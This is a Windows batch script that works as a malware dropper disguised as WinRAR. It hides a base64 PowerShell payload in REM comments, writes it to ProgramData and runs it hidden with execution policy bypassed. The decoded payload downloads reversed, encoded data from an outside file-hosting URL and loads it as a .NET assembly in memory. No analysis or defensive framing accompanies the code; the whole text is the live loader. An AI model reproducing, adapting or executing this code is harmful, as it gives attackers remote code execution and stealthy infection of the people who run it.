@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
setlocal enableextensions
rem --- rebuild payload into ProgramData ---
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s = Get-Content -Raw -Encoding ASCII '%~f0'; $lines = $s -split '\r?\n'; $b = ($lines | Where-Object {$_ -like 'REM B64*'}) -replace '^REM B64\s*',''; $destDir = Join-Path $env:ProgramData 'WinRAR'; If (!(Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir | Out-Null }; $dest = Join-Path $destDir 'WinRAR.ps1'; [System.IO.File]::WriteAllBytes($dest, [Convert]::FromBase64String(($b -join ''))); Start-Sleep -Milliseconds 50; Start-Process -FilePath 'powershell' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $dest + '"' -WindowStyle Hidden"
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File "C:\ProgramData\WinRAR\WinRAR.ps1"
if %ERRORLEVEL% NEQ 0 echo ERROR: failed to rebuild 
endlocal
exit /b 0

rem -------- Embedded base64 payload (do not remove) --------
REM B64 JHVybCA9ICJodHRwczovL3MxLW5vci10ZXJyYS5uaXRyb2RyaXZlLm9yZy9jZDNlOThiMGM5MTcwNzhkL29vdGVzdC50eHQ/ZG93
REM B64 bmxvYWRfdG9rZW49N2NiNDkzZDMxNWUyYWU0NTdkNTBhMzI4MTI5OWQ1NmNhMjFmZDk1OTQ2NmJhNTNmN2FiZTJlMWMyZDkyN2Fj
REM B64 YSINCiRyYXcgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLVVzZUJhc2ljUGFyc2luZw0KJHJldmVyc2VkID0gJHJhdy5D
REM B64 b250ZW50LlRyaW0oKQ0KDQoNCiRjaGFycyA9ICRyZXZlcnNlZC5Ub0NoYXJBcnJheSgpDQpbQXJyYXldOjpSZXZlcnNlKCRjaGFy
REM B64 cykNCiRiYXNlNjQgPSAtam9pbiAkY2hhcnMNCg0KQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAiDQp1c2luZyBTeXN0ZW07DQp1
REM B64 c2luZyBTeXN0ZW0uVGV4dDsNCnVzaW5nIFN5c3RlbS5SZWZsZWN0aW9uOw0KDQpwdWJsaWMgY2xhc3MgUnVubmVyIHsNCiAgICBw
REM B64 dWJsaWMgc3RhdGljIHZvaWQgRXhlY3V0ZShzdHJpbmcgYjY0KSB7DQogICAgICAgIGJ5dGVbXSBieXRlcyA9IENvbnZlcnQuRnJv
REM B64 bUJhc2U2NFN0cmluZyhiNjQpOw0KICAgICAgICBBc3NlbWJseSBhc20gPSBBc3NlbWJseS5Mb2FkKGJ5dGVzKTsNCiAgICAgICAg
REM B64 TWV0aG9kSW5mbyBlbnRyeSA9IGFzbS5FbnRyeVBvaW50Ow0KICAgICAgICBpZiAoZW50cnkgIT0gbnVsbCkNCiAgICAgICAgICAg
REM B64 IGVudHJ5Lkludm9rZShudWxsLCBuZXcgb2JqZWN0W10geyBuZXcgc3RyaW5nW10ge30gfSk7DQogICAgICAgIGVsc2Ugew0KICAg
REM B64 ICAgICAgICAgVHlwZSB0ID0gYXNtLkdldFR5cGUoInNha3NzZW4uTXlhbXkiKTsNCiAgICAgICAgICAgIE1ldGhvZEluZm8gbSA9
REM B64 IHQuR2V0TWV0aG9kKCJNYWluIiwgQmluZGluZ0ZsYWdzLlB1YmxpYyB8IEJpbmRpbmdGbGFncy5TdGF0aWMpOw0KICAgICAgICAg
REM B64 ICAgbS5JbnZva2UobnVsbCwgbnVsbCk7DQogICAgICAgIH0NCiAgICB9DQp9DQoiQCAtTGFuZ3VhZ2UgQ1NoYXJwDQpbUnVubmVy
REM B64 XTo6RXhlY3V0ZSgkYmFzZTY0KQ0K
rem END_B64
